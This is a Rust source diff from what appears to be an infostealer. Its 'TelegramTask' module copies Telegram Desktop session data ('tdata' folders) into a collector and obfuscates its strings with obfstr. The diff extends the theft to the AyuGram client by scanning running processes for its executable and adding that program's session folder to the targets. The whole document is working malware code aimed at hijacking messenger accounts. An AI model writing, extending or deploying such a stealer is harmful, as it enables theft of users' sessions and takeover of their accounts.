@@ -1,5 +1,8 @@
 use alloc::borrow::ToOwned;
 use alloc::fmt::format;
+use alloc::string::String;
+use alloc::sync::Arc;
+use alloc::vec::Vec;
 use alloc::{format, vec};
 use collector::{Collector, Software};
 use filesystem::path::Path;
@@ -7,13 +10,31 @@ use filesystem::storage::StorageFileSystem;
 use filesystem::{copy_file, copy_folder, FileSystem, FileSystemExt};
 use obfstr::obfstr as s;
 use tasks::Task;
+use utils::log_debug;
+use utils::process::{get_process_list, get_process_path_by_pid, ProcessInfo};
 
 pub(super) struct TelegramTask;
+
+macro_rules! find_first_process {
+    ($processes:expr => $client_name:expr; $($process_name:expr),+ => $extend:expr) => {
+        let mut found = false;
+        $(
+            if !found {
+                if let Some(path) = find_process_path(obfstr::obfstr!($process_name), $processes)
+                    && let Some(path) = path.parent()
+                {
+                    $extend.extend([(obfstr::obfstr!($client_name).to_owned(), path / "tdata")]);
+                    found = true;
+                }
+            }
+        )+
+    };
+}
 
 impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let appdata = &Path::appdata();
-        let paths = [
+        let mut paths = vec![
             (
                 s!("Telegram Desktop").to_owned(),
                 appdata / s!("Telegram Desktop") / s!("tdata"),
@@ -24,6 +45,9 @@ impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
             ),
         ];
 
+        let processes = &get_process_list();
+        find_first_process!(processes => "AyuGram"; "AyuGram.exe" => paths);
+
         for (client, tdata_path) in paths {
             if StorageFileSystem.is_exists(&tdata_path) {
                 let dst = parent / client;
@@ -31,6 +55,15 @@ impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
             }
         }
     }
+}
+
+fn find_process_path(process_name: &str, processes: &[ProcessInfo]) -> Option<Path> {
+    let pid = processes
+        .iter()
+        .find(|process| process.name == Arc::from(process_name))?
+        .pid;
+
+    get_process_path_by_pid(pid)
 }
 
 fn copy_tdata<C, F>(tdata: &Path, dst_filesystem: &F, dst: &Path, collector: &C)
@@ -60,7 +93,7 @@ where
         for dir in &dirs {
             if let Some(dir_name) = dir.name()
                 && let Some(file_name) = file.name()
-                && dir_name == format!("s{file_name}")
+                && format!("{dir_name}s") == file_name
             {
                 contents.push(file);
                 contents.push(dir);
